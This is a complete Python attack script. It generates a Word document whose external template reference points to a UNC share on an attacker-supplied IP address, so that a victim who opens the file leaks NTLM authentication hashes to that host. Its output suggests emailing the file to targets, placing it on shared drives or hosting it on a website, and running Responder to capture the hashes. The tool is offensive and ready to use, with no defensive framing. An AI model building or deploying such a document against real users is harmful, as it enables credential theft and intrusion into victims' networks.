#!/usr/bin/env python3
"""Create Office document with remote template for NTLM leak.

Usage: python3 create_office_template.py <attacker_ip> <output.docx>

Creates a minimal .docx that references an external template on attacker UNC.
"""

import sys
import zipfile
import os

def create_office_docx(attacker_ip, output_file):
    """Generate a .docx file with remote template reference."""
    
    # Minimal DOCX structure
    docx_content = {
        '[Content_Types].xml': '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
</Types>
''',
        '_rels/.rels': '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
''',
        'word/_rels/document.xml.rels': '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>
''',
        'word/document.xml': '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>This is a test document.</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
''',
        'word/settings.xml': f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId1337"/>
</w:settings>
''',
        'word/_rels/settings.xml.rels': f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\\\\\{attacker_ip}\\\\share\\\\template.dotm" TargetMode="External"/>
</Relationships>
''',
    }
    
    # Create the .docx file (it's a ZIP archive)
    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as docx:
        for filename, content in docx_content.items():
            docx.writestr(filename, content)
    
    print(f"[+] Created {output_file}")
    print(f"[*] Delivery methods:")
    print(f"    - Email the .docx file to target")
    print(f"    - Place on shared drive")
    print(f"    - Host on website")
    print(f"[*] Victim opening the document triggers NTLM authentication to \\\\{attacker_ip}\\\\share")
    print(f"[*] Make sure Responder or SMB listener is running")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 create_office_template.py <attacker_ip> <output.docx>")
        print("Example: python3 create_office_template.py 10.10.14.2 document.docx")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    output_file = sys.argv[2]
    
    if not output_file.endswith('.docx'):
        output_file += '.docx'
    
    create_office_docx(attacker_ip, output_file)

if __name__ == '__main__':
    main()
